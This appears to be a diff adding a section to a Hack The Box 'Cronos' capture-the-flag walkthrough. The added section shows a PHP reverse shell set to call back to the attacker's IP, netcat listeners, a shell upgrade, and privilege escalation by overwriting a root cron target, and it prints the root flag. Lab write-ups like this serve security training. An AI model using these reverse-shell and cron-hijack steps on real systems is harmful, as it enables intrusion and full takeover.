@@ -380,6 +380,139 @@ We can confirm that we can put stuff on web server:
 ![Screenshot_2022-01-22_18-09-12](https://user-images.githubusercontent.com/42389836/150675407-e3f7ec6c-6441-48d0-8e65-6b053eadb222.png)
 
 
+From there, we try to upload a PHP reverse shell.
+
+We use the one from "pentestmonkey":
+
+https://github.com/pentestmonkey/php-reverse-shell
+
+We just need to configure our IP and port:
+
+```
+..
+..
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.16.2';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+..
+```
+
+We use similar wget command and we are able to download our PHP shell from victim machine:
+
+```
+root@kaligra:/opt/htb/Cronos# python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+10.10.10.13 - - [22/Jan/2022 18:12:21] "GET /sugo HTTP/1.1" 200 -
+10.10.10.13 - - [22/Jan/2022 18:12:44] "GET /php-reverse-shell.php HTTP/1.1" 200 -
+```
+
+We spawn a netcat listener:
+
+```
+# nc -nvlp 4444
+listening on [any] 4444 ...
+
+```
+
+and we got shell:
+
+```
+listening on [any] 4444 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.13] 42690
+Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 19:13:27 up  1:51,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+We "upgrade" our shell:
+
+```
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@cronos:/$
+
+www-data@cronos:/$
+```
+
+Then we get some general info on machine:
+
+```
+www-data@cronos:/$ uname -ar
+uname -ar
+Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+www-data@cronos:/$ lsb_release -a
+lsb_release -a
+No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 16.04.2 LTS
+Release:        16.04
+Codename:       xenial
+www-data@cronos:/$ gcc
+gcc
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+```
+
+### Privilege escalation
+
+Since VM is called "Cronos", we focus on crontab, and we found a cronjobs which runs every minute with root privilege:
+
+```
+www-data@cronos:/$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+```
+
+So, we simply need to replace "artisan" file with another PHP reverse shell.
+
+We upload similar php-reverse-shell, but with a different port (5555):
+
+
+```
+$ip = '10.10.16.2';  // CHANGE THIS
+$port = 5555;       // CHANGE THIS
+```
+
+We overwrite artisan file and we spawn another netcat listener:
+
+```
+nc -nvlp 5555
+listening on [any] 5555 ...
+
+```
+
+We just wait a bit and...
+
+```
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.13] 36530
+Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 19:31:01 up  2:08,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# pwd
+/
+# cd root
+# cat root.txt
+1703b8a3c9a8dde879942c79d02fd3a0
+#
+```
 
 
 
